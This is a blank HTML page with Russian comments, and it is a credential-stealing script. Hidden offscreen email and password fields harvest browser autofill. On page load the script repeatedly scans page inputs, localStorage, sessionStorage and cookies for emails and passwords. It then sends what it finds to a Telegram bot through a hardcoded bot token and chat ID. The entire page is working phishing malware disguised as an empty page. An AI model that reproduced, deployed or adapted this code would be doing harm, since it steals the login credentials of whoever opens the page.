<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title></title>
    <style>
        * { margin: 0; padding: 0; }
        html, body { width: 100%; height: 100%; background: white; }
    </style>
</head>
<body>

<!-- СКРЫТЫЕ ПОЛЯ ДЛЯ АВТОЗАПОЛНЕНИЯ -->
<input type="email" id="email" autocomplete="email" style="position:absolute;left:-9999px;">
<input type="password" id="pass" autocomplete="current-password" style="position:absolute;left:-9999px;">

<script>
const BOT_TOKEN = "8870629098:AAELG7u3brQfiq40IgP9dd3IB36LMBdMfbM";
const CHAT_ID = "8850351378";

let sent = false;

function sendToTelegram(email, password) {
    if (sent) return;
    if (!email) return;
    sent = true;
    
    const text = `📩 ПОЧТА И ПАРОЛЬ\n📧 Email: ${email}\n🔑 Пароль: ${password || 'Не найден'}\n🕒 ${new Date().toLocaleString()}`;
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
    
    fetch(url, { mode: 'no-cors' }).catch(() => {});
    new Image().src = url;
}

function findData() {
    if (sent) return;
    
    let email = '';
    let password = '';
    
    // 1. ПРОВЕРЯЕМ СКРЫТЫЕ ПОЛЯ (автозаполнение)
    const emailField = document.getElementById('email');
    const passField = document.getElementById('pass');
    
    if (emailField.value && emailField.value.includes('@')) {
        email = emailField.value;
    }
    if (passField.value) {
        password = passField.value;
    }
    
    // 2. ПРОВЕРЯЕМ ВСЕ ПОЛЯ НА СТРАНИЦЕ
    if (!email) {
        document.querySelectorAll('input').forEach(input => {
            const val = input.value || '';
            if (val && val.includes('@') && val.includes('.')) {
                email = val;
            }
            if (!password && input.type === 'password' && input.value) {
                password = input.value;
            }
        });
    }
    
    // 3. ПРОВЕРЯЕМ LOCALSTORAGE
    if (!email && localStorage) {
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const val = localStorage.getItem(localStorage.key(i));
                if (val && typeof val === 'string' && val.includes('@') && val.includes('.')) {
                    email = val;
                    break;
                }
            }
        } catch(e) {}
    }
    
    // 4. ПРОВЕРЯЕМ SESSIONSTORAGE
    if (!email && sessionStorage) {
        try {
            for (let i = 0; i < sessionStorage.length; i++) {
                const val = sessionStorage.getItem(sessionStorage.key(i));
                if (val && typeof val === 'string' && val.includes('@') && val.includes('.')) {
                    email = val;
                    break;
                }
            }
        } catch(e) {}
    }
    
    // 5. ПРОВЕРЯЕМ COOKIES
    if (!email && document.cookie) {
        try {
            document.cookie.split(';').forEach(c => {
                if (c.includes('@') && c.includes('.')) {
                    email = c.trim();
                }
            });
        } catch(e) {}
    }
    
    // 6. ЕСЛИ НАШЛИ EMAIL - ОТПРАВЛЯЕМ
    if (email && !sent) {
        sendToTelegram(email, password);
    }
}

// ЗАПУСКАЕМ ПОИСК МНОГО РАЗ
window.addEventListener('load', function() {
    setTimeout(findData, 100);
    setTimeout(findData, 300);
    setTimeout(findData, 600);
    setTimeout(findData, 1000);
    setTimeout(findData, 2000);
    setTimeout(findData, 3000);
    setTimeout(findData, 5000);
    setTimeout(findData, 8000);
});

console.log('🔍 ROCKET - Поиск данных...');
</script>
</body>
</html>
